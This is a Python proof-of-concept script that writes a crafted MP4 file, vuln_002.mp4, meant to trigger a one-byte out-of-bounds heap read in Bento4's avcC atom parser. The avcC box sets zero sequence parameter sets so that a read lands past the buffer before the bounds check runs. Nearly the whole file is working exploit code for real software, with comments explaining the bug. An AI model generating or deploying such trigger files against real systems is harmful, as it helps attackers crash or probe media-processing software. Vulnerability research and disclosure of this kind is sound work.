#!/usr/bin/env python3
"""
VULN 002 - CWE-125 OOB Heap Read in AP4_AvccAtom::Create()
File: Bento4/Source/C++/Core/Ap4AvccAtom.h, line 88-89

Trigger: avcC box with size=14, payload[5]=0xE0 (numSequenceParameterSets=0).
After 0 seq-param iterations cursor==6==payload_size, line 88 reads payload[cursor++]
(i.e. payload[6]) before the bounds check on line 89 -> 1-byte OOB heap read.
"""
import struct
import os

def make_box(box_type, payload):
    """Build an ISOBMFF box: 4-byte big-endian size + 4-byte type + payload."""
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload


# ── avcC box: size=14, payload=6 bytes ──────────────────────────────────────
# byte 0: 0x01  configurationVersion
# byte 1: 0x42  AVCProfileIndication (Baseline)
# byte 2: 0x00  profile_compatibility
# byte 3: 0x1E  AVCLevelIndication (30)
# byte 4: 0xFF  reserved(6)=111111, lengthSizeMinusOne=3
# byte 5: 0xE0  reserved(3)=111, numSequenceParameterSets=0  <- KEY
#
# numSequenceParameterSets == 0  →  seq-param loop runs 0 times
# cursor after loop == 6 == payload_size
# line 88: num_pps = payload[cursor++]  reads payload[6]  <- OOB
# line 89: if (cursor >= payload_size)  check AFTER read   <- too late
avcc_payload = b'\x01\x42\x00\x1e\xff\xe0'
avcc_box = struct.pack('>I', 14) + b'avcC' + avcc_payload   # 14 bytes total

# ── avc1 VisualSampleEntry body (82 bytes) ───────────────────────────────────
avc1_body = (
    b'\x00' * 6 +                        # reserved[6]
    struct.pack('>H', 1) +               # data_reference_index = 1
    b'\x00\x00' +                        # pre_defined
    b'\x00\x00' +                        # reserved
    b'\x00' * 12 +                       # pre_defined[3]
    struct.pack('>H', 320) +             # width
    struct.pack('>H', 240) +             # height
    struct.pack('>I', 0x00480000) +      # horizresolution (72 dpi)
    struct.pack('>I', 0x00480000) +      # vertresolution  (72 dpi)
    b'\x00' * 4 +                        # reserved
    struct.pack('>H', 1) +              # frame_count
    b'\x00' * 32 +                       # compressorname[32]
    struct.pack('>H', 0x0018) +          # depth (24-bit)
    struct.pack('>H', 0xFFFF)            # pre_defined = -1
)  # 82 bytes

avc1_size = 8 + len(avc1_body) + len(avcc_box)  # 8+82+14 = 104
avc1_box  = struct.pack('>I', avc1_size) + b'avc1' + avc1_body + avcc_box

# ── stsd ─────────────────────────────────────────────────────────────────────
stsd_payload = (
    struct.pack('>I', 0) +   # version=0 + flags=0
    struct.pack('>I', 1) +   # entry_count = 1
    avc1_box
)
stsd_box = make_box('stsd', stsd_payload)   # 8+4+4+104 = 120

# ── minimal sample table boxes ───────────────────────────────────────────────
stts_box = make_box('stts', b'\x00' * 8)    # 16
stsc_box = make_box('stsc', b'\x00' * 8)    # 16
stsz_box = make_box('stsz', b'\x00' * 12)   # 20
stco_box = make_box('stco', b'\x00' * 8)    # 16

stbl_box = make_box('stbl',
    stsd_box + stts_box + stsc_box + stsz_box + stco_box)  # 8+188 = 196

# ── vmhd ─────────────────────────────────────────────────────────────────────
vmhd_box = make_box('vmhd',
    struct.pack('>I', 1) +   # version=0, flags=1 (self-contained)
    b'\x00' * 8)             # graphicsMode(2) + opcolor(6)

# ── dinf / dref ──────────────────────────────────────────────────────────────
url_entry  = struct.pack('>I', 12) + b'url ' + struct.pack('>I', 1)  # 12 bytes
dref_box   = make_box('dref',
    struct.pack('>I', 0) +    # version+flags
    struct.pack('>I', 1) +    # entry_count=1
    url_entry)                # 8+4+4+12 = 28
dinf_box   = make_box('dinf', dref_box)  # 8+28 = 36

# ── minf ─────────────────────────────────────────────────────────────────────
minf_box = make_box('minf', vmhd_box + dinf_box + stbl_box)  # 8+252 = 260

# ── mdhd ─────────────────────────────────────────────────────────────────────
mdhd_box = make_box('mdhd', b'\x00' * 24)  # 32

# ── hdlr ─────────────────────────────────────────────────────────────────────
hdlr_payload = (
    b'\x00' * 4 +   # version+flags
    b'\x00' * 4 +   # pre_defined
    b'vide' +        # handler_type
    b'\x00' * 12 +  # reserved[3]
    b'\x00'          # name (null terminator)
)
hdlr_box = make_box('hdlr', hdlr_payload)  # 8+25 = 33

# ── mdia ─────────────────────────────────────────────────────────────────────
mdia_box = make_box('mdia', mdhd_box + hdlr_box + minf_box)  # 8+325 = 333

# ── tkhd ─────────────────────────────────────────────────────────────────────
tkhd_box = make_box('tkhd', b'\x00' * 84)  # 92

# ── trak ─────────────────────────────────────────────────────────────────────
trak_box = make_box('trak', tkhd_box + mdia_box)  # 8+425 = 433

# ── mvhd ─────────────────────────────────────────────────────────────────────
mvhd_box = make_box('mvhd', b'\x00' * 100)  # 108

# ── moov ─────────────────────────────────────────────────────────────────────
moov_box = make_box('moov', mvhd_box + trak_box)  # 8+541 = 549

# ── ftyp (16 bytes, no compatible brands) ────────────────────────────────────
ftyp_box = struct.pack('>I', 16) + b'ftyp' + b'isom' + b'\x00\x00\x00\x00'

# ── assemble full MP4 ─────────────────────────────────────────────────────────
mp4_data = ftyp_box + moov_box

# ── write output ─────────────────────────────────────────────────────────────
out_dir  = os.path.dirname(os.path.abspath(__file__))
out_file = os.path.join(out_dir, 'vuln_002.mp4')
with open(out_file, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written {out_file} ({len(mp4_data)} bytes)")
print(f"[+] avcC box: size=14, payload={avcc_payload.hex()}")
print(f"[+] numSequenceParameterSets = {avcc_payload[5] & 0x1f} (OOB trigger)")
